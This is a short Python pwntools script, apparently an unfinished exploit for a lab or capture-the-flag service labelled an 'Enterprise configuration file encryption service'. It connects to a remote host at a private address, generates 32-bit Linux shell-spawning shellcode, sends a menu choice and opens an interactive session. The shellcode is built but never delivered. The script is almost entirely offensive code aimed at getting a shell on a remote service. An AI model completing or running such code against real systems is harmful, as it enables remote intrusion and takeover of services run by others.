from pwn import *

global io
def sendcommand(cmd):
    
        io.sendline(cmd)
        output = io.recvline()
        if output:
            return output.decode()


def get_shellcode32():
    context.update(arch='i386',os='linux')
    return asm(shellcraft.sh())


io = remote("172.16.81.129",20002)



shellcode = get_shellcode32()

io.recvuntil("[-- Enterprise configuration file encryption service --]");
io.sendline("E")
io.interactive()

